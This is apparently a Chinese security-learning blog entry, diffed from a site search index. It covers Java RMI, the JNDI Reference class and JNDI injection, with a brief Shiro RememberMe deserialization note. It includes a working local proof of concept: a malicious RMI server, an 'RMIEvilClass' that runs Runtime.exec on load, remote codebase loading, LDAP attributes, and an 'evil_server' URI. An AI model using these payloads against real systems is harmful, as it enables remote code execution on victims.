+<p>比如说我们有这么一个接口</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.interfaces;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>服务端对外屏蔽实现</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteHello</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Method `RemoteHelloImpl.hello` is called.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>服务端的 RMI 服务</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里将 <code>hello</code> 对象资源绑定到命名为 <code>hello</code> 的
+RMI Registry 中。</p>
+<p>客户端的 RMI 服务</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RemoteHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI hello ret value: &quot;</span> + ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样就实现了远程对象获取，对客户端屏蔽了实现，仅需服务端进行垃圾回收和资源管理，而多台客户端可以大量获取服务端资源而减少性能损耗，为分布式提供可能。</p>
+<p>这里调用的 <code>hello.hello()</code>
+在本地并没有相应的执行过程，而是<strong>远程对象的远程方法调用</strong>，具体执行过程是在服务端，客户端仅获取到服务端的运行结果。</p>
+<p>而 JNDI 下的 RMI，通过 SPI 实现协议接口，可以通过 Naming Server
+直接获取 RMI 资源，例如</p>
+<p>服务端代码改写为</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloImpl</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而客户端代码改写为</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException, RemoteException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RemoteHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI hello ret value: &quot;</span> + ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="reference">Reference</h2>
+<p>Reference
+嘞表示对存在于<strong>命名/目录系统外</strong>的对象的引用。</p>
+<p>比如说</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refClassName&quot;</span>, <span class="string">&quot;insClassName&quot;</span>, <span class="string">&quot;http://example.com:12345/&quot;</span>);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>
+<p>当有客户端通过 lookup 查询 <code>refObj</code>
+资源获取远程对象时，会获得一个 <code>Reference</code>
+类的存根，而对于该类客户端会寻找 <code>refClassName</code>
+匹配的类名。</p>
+<p><code>javax.naming.Reference</code>构造方法为：<code>Reference(String className, String factory, String factoryLocation)</code>，</p>
+<ol type="1">
+<li><code>className</code> - 远程加载时所使用的类名</li>
+<li><code>classFactory</code> -
+加载的<code>class</code>中需要实例化类的名称</li>
+<li><code>classFactoryLocation</code> -
+提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>等协议</li>
+</ol>
+<p>Reference
+的使用场景在于实例化对象的引用，对于某些数据类我们是希望在本地执行过程而非在远程执行的，所以我们可以通过
+Reference 类获取类字节码，随后在本地实例化它。</p>
+<p>而 ReferenceWrapper 是包装类，用于保证 Reference 可以被 RMI
+协议传输。</p>
+<h1 id="jndi-注入">JNDI 注入</h1>
+<h2 id="防御措施">防御措施</h2>
+<p>那么如果说 JNDI 客户端的 <code>lookup</code> 参数可控，服务端
+<code>Reference</code> 的 <code>classFactoryLocation</code>
+可控，那么我们就可以使其执行一些恶意代码。</p>
+<p>利用流程如下：</p>
+<ul>
+<li>目标代码中调用了
+<code>InitialContext.lookup(URI)</code>，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：<code>rmi://evil_server/name</code>；</li>
+<li>攻击者RMI服务器向目标返回一个<code>Reference</code>对象，<code>Reference</code>对象中指定某个精心构造的<code>Factory</code>类；</li>
+<li>目标在进行<code>lookup()</code>操作时，会动态加载并实例化Factory类，接着调用<code>factory.getObjectInstance()</code>获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的构造方法、静态代码块、<code>getObjectInstance()</code>方法等处写入恶意代码，达到RCE的效果</li>
+</ul>
+<p>为了防止 JNDI 注入，下文是 Java 作的一些防御措施</p>
+<ul>
+<li>JDK
+6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI
+ClassLoader的安全性。</li>
+<li>JDK
+6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
+<li>JDK
+6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
+</ul>
+<h2 id="rmi-利用">RMI 利用</h2>
+<h3 id="低版本">低版本</h3>
+<p>首先编写客户端和服务端代码，假定 Reference 的 location
+可控，那么一份客户端代码可能如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.rmi.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">location</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, NamingException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;RMIEvilClass&quot;</span>, <span class="string">&quot;RMIEvilClass&quot;</span>, location);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;ref&quot;</span>, refWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里 location 端口选择 8000 是因为 Python 的 <code>http.server</code>
+的默认启动端口是 8000。</p>
+<p>而客户端那边省略无关代码，剩下的框架如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.rmi.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/ref&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>远程利用的情况下（通过可控 location
+下载字节码），需要<strong>新建一个模块进行复现</strong>，在新建的模块中编写恶意类代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIEvilClass</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在不开启 <code>http.server</code>
+的情况下，客户端可以成功运行，但不会执行恶意类代码（因为找不到）。</p>
+<p>在开启 <code>http.server</code> 的情况下，客户端看可以成功运行，会从
+location 下载字节码，可以观察到日志如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::ffff:127.0.0.1 - - [24/Apr/2024 20:04:21] &quot;GET /RMIEvilClass.class HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+<p>需要知道的是，实例化类时加载优先级为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态块&gt;IIB块&gt;构造函数&gt;getObjectInstance</span><br></pre></td></tr></table></figure>
+<p>由于 <code>getObjectInstance</code> 返回值为 <code>null</code>，故
+<code>lookup</code> 结果为 <code>null</code>。</p>
+<h3 id="高版本">高版本</h3>
+<p>为了绕过这里 ConfigurationException 的限制，我们有三种方法:</p>
+<ol type="1">
+<li>令 <code>ref</code> 为空</li>
+<li>令 <code>ref.getFactoryClassLocation</code>() 为空</li>
+<li>令 <code>trustURLCodebase</code> 为 <code>true</code></li>
+</ol>
+<p>第一种为空会导致无法实例化远程
+RMI，第三种为空不太现实，这时只能选择第二种方法。</p>
+<p>此时选择 <code>org.apache.naming.factory.BeanFactory</code>，这是
+tomcat 会使用到的工厂类，用于实例化 bean。</p>
+<h2 id="ldap-利用">LDAP 利用</h2>
+<h3 id="低版本-1">低版本</h3>
+<p>LDAP 服务作为一个树形数据库，可以通过一些特殊的属性来实现 Java
+对象的存储。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectClass: javaNamingReference</span><br><span class="line">javaCodebase: http:<span class="comment">//localhost:8000/</span></span><br><span class="line">JavaFactory: RMIEvilClass</span><br><span class="line">javaClassName: RMIEvilClass</span><br></pre></td></tr></table></figure>
+<p>这就相当于 RMI 中的 Reference，配置其中的
+<code>className</code>，<code>classFactory</code> 饿
+<code>classFactoryLocation</code>，其实本质与 RMI 服务器无差异。</p>
+<h3 id="高版本-1">高版本</h3>
+<h1 id="参考">参考</h1>
+<p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/">高低版本
+JNDI 注入</a></p>
+<p><a href="https://fynch3r.github.io/%E6%90%9E%E6%87%82JNDI/">JNDI
+注入</a></p>
+<p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/jndi%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/">JNDI
+注入漏洞</a></p>
+<p><a href="https://xz.aliyun.com/t/8214">JNDI 注入学习</a></p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shiro笔记</title>
+    <url>//shiro-note.html</url>
+    <content><![CDATA[<h1 id="shiro-的二三事">Shiro 的二三事</h1>
+<p>Apache Shiro
+是一个开源安全框架，提供身份验证、授权、密码学和会话管理。</p>
+<p>Apache
+Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。</p>
+<p>攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p>
+]]></content>
+      <tags>
+        <tag>java</tag>
       </tags>
   </entry>
 </search>
